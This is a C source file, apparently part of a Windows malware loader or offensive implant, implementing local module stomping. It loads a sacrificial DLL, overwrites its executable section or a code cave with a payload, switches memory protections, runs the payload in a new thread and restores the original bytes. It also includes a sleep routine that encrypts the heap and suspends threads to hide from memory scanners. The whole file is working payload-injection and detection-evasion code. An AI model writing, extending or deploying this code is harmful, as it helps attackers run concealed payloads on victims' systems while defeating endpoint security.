#include "Common.h"
#include <rpcdce.h>
#pragma comment(lib, "Rpcrt4.lib")

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

BOOLEAN ReplaceTextSection
(
	_In_ PBYTE TextSection,
	_In_ PBYTE OriginalTextSection,
	_In_ SIZE_T TextSectionSize
)
{

	//------------------------------------------------------

	NTSTATUS	Status			= STATUS_SUCCESS;

	PVOID		BaseAddress		= C_PTR(TextSection);
	SIZE_T		Size			= TextSectionSize;
	DWORD		OldProtection	= 0;

	//------------------------------------------------------

	if (!NT_SUCCESS(Status = pNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &Size, PAGE_EXECUTE_READWRITE, &OldProtection)))
	{
#ifdef DEBUG
		PRINT_ERROR("NtProtectVirtualMemory");
#endif
		return FALSE;
	}

	//------------------------------------------------------

	MEMCPY(TextSection, OriginalTextSection, TextSectionSize);

	pFlushInstructionCache(NtCurrentProcess(), TextSection, TextSectionSize);

	//------------------------------------------------------

	if (!NT_SUCCESS(Status = pNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &Size, PAGE_READWRITE, &OldProtection)))
	{
#ifdef DEBUG
		PRINT_ERROR("NtProtectVirtualMemory");
#endif
		return FALSE;
	}

	//------------------------------------------------------

	return TRUE;

}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

VOID WINAPI My_Sleep
(
	_In_ DWORD dwMilliseconds
)
{

	CryptSuspendThreads();

	HeapCrypt();
	pSleep(dwMilliseconds);

	CryptResumeThreads();

}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

BOOLEAN LocalModuleStompRxSection
(
	_In_ LPCWSTR	SacrificialDllName,
	_In_ PVOID		Payload,
	_In_ SIZE_T		PayloadSize
)
{

	NTSTATUS	Status					= STATUS_SUCCESS;

	PVOID		TargetRxSection			= NULL;
	PVOID		TargetModule			= NULL;
	PVOID		PayloadAddress			= NULL;
	PVOID		ThreadHandle			= NULL;

	DWORD		OldProtection			= 0;
	PBYTE		OriginalTextSection		= 0;
	SIZE_T		Size					= 0;
	SIZE_T		SectionSize				= 0;

	//------------------------------------------------------

	TargetModule = pLoadLibraryExW(SacrificialDllName, NULL, DONT_RESOLVE_DLL_REFERENCES);

	//------------------------------------------------------

	if ((TargetRxSection = FetchRXLocation(TargetModule, PayloadSize, &SectionSize)) == NULL)
	{
#ifdef DEBUG
		PRINT_ERROR("FetchRxLocation");
#endif
		return FALSE;
	}

	if ((OriginalTextSection = HeapAlloc(pGetProcessHeap(), HEAP_ZERO_MEMORY, SectionSize)) == NULL)
	{
#ifdef DEBUG
		PRINT_ERROR("HeapAlloc");
#endif
		return FALSE;
	}

	MEMCPY(OriginalTextSection, TargetRxSection, SectionSize);

	//------------------------------------------------------

	PayloadAddress	= TargetRxSection;
	Size			= PayloadSize;

	if (!NT_SUCCESS(Status = pNtProtectVirtualMemory(NtCurrentProcess(), &PayloadAddress, &Size, PAGE_READWRITE, &OldProtection)))
	{
#ifdef DEBUG
		NT_ERROR("NtProtectVirtualMemory 1");
#endif
		return FALSE;
	}

	//------------------------------------------------------

	My_Sleep(4000);

	MEMCPY(TargetRxSection, Payload, PayloadSize);

	//------------------------------------------------------

	PayloadAddress	= TargetRxSection;
	Size			= PayloadSize;

	if (!NT_SUCCESS(Status = pNtProtectVirtualMemory(NtCurrentProcess(), &PayloadAddress, &Size, PAGE_EXECUTE_READ, &OldProtection)))
	{
#ifdef DEBUG
		NT_ERROR("NtProtectVirtualMemory 2");
#endif
		return FALSE;
	}

	//------------------------------------------------------

	if (!NT_SUCCESS(Status = pNtCreateThreadEx(&ThreadHandle, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), TargetRxSection, NULL, 0, 0, 0, 0, NULL)))
	{
#ifdef DEBUG
		NT_ERROR("NtCreateThreadEx");
#endif
		return FALSE;
	}

	pWaitForSingleObject(ThreadHandle, INFINITE);

	//------------------------------------------------------

	if (!ReplaceTextSection((PBYTE)TargetRxSection, OriginalTextSection, SectionSize))
	{
#ifdef DEBUG
		PRINT_ERROR("ReplaceTextSection");
#endif
		return FALSE;
	}

	if (ThreadHandle != NULL && ThreadHandle != INVALID_HANDLE_VALUE)
		pCloseHandle(ThreadHandle);

	if (OriginalTextSection != NULL)
		pHeapFree(pGetProcessHeap(), 0, OriginalTextSection);

	return TRUE;

}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

// Reference: BreadManModuleStomping

BOOLEAN LocalModuleStompCodeCave
(
	_In_ LPCWSTR	SacrificialDllName,
	_In_ PVOID		Payload,
	_In_ SIZE_T		PayloadSize
)
{

	NTSTATUS	Status					= STATUS_SUCCESS;

	PVOID		TargetModule			= NULL;
	PVOID		PayloadAddress			= NULL;
	PVOID		ThreadHandle			= NULL;

	DWORD		OldProtection			= 0;
	PBYTE		CodeCaveAddress			= 0;
	PBYTE		OriginalTextSection		= 0;
	SIZE_T		Size					= 0;

	//------------------------------------------------------

	TargetModule = pLoadLibraryExW(SacrificialDllName, NULL, DONT_RESOLVE_DLL_REFERENCES);

	//------------------------------------------------------

	if (!FindCodeCave(TargetModule, PayloadSize, &CodeCaveAddress))
	{
#ifdef DEBUG
		PRINT_ERROR("FindCodeCave");
#endif
		return FALSE;
	}

	if ((OriginalTextSection = HeapAlloc(pGetProcessHeap(), HEAP_ZERO_MEMORY, PayloadSize)) == NULL)
	{
#ifdef DEBUG
		PRINT_ERROR("HeapAlloc");
#endif
		return FALSE;
	}

	MEMCPY(OriginalTextSection, CodeCaveAddress, PayloadSize);

	//------------------------------------------------------

	PayloadAddress	= CodeCaveAddress;
	Size			= PayloadSize;

	if (!NT_SUCCESS(Status = pNtProtectVirtualMemory(NtCurrentProcess(), &PayloadAddress, &Size, PAGE_READWRITE, &OldProtection)))
	{
#ifdef DEBUG
		NT_ERROR("NtProtectVirtualMemory 1");
#endif
		return FALSE;
	}

	//------------------------------------------------------

	My_Sleep(4000);

	MEMCPY(CodeCaveAddress, Payload, PayloadSize);

	//------------------------------------------------------

	PayloadAddress	= CodeCaveAddress;
	Size			= PayloadSize;

	if (!NT_SUCCESS(Status = pNtProtectVirtualMemory(NtCurrentProcess(), &PayloadAddress, &Size, PAGE_EXECUTE_READ, &OldProtection)))
	{
#ifdef DEBUG
		NT_ERROR("NtProtectVirtualMemory 2");
#endif
		return FALSE;
	}

	//------------------------------------------------------

	if (!NT_SUCCESS(Status = pNtCreateThreadEx(&ThreadHandle, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), CodeCaveAddress, NULL, 0, 0, 0, 0, NULL)))
	{
#ifdef DEBUG
		NT_ERROR("NtCreateThreadEx");
#endif
		return FALSE;
	}

	pWaitForSingleObject(ThreadHandle, INFINITE);

	//------------------------------------------------------

	if (!ReplaceTextSection(CodeCaveAddress, OriginalTextSection, PayloadSize))
	{
#ifdef DEBUG
		PRINT_ERROR("ReplaceTextSection");
#endif
		return FALSE;
	}

	if (ThreadHandle != NULL && ThreadHandle != INVALID_HANDLE_VALUE)
		pCloseHandle(ThreadHandle);

	if (OriginalTextSection != NULL)
		pHeapFree(pGetProcessHeap(), 0, OriginalTextSection);

	//------------------------------------------------------

	return TRUE;

}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=